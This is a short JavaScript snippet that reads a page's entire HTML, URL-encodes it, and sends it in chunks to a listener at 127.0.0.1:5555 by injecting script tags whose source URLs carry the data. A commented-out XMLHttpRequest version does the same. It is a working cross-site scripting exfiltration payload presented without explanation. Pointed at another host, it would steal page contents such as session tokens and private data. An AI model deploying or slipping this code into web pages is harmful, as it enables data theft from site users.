var a = ($('html').html());
var url = "http://127.0.0.1:5555/";
var len = 4896;
var enc = encodeURI(a);
var request = new XMLHttpRequest();
/*function httpGet(url,par)
{
request.open('GET', url+par, false);
request.send(null);
}*/
for(var i = 0; i <= enc.length+len; i+=len){
	var par = enc.slice(i,i+len);
	var script   = document.createElement("script");
	script.type  = "text/javascript";
	script.src   = url+par;
	document.body.appendChild(script);
}
//httpGet(url,par);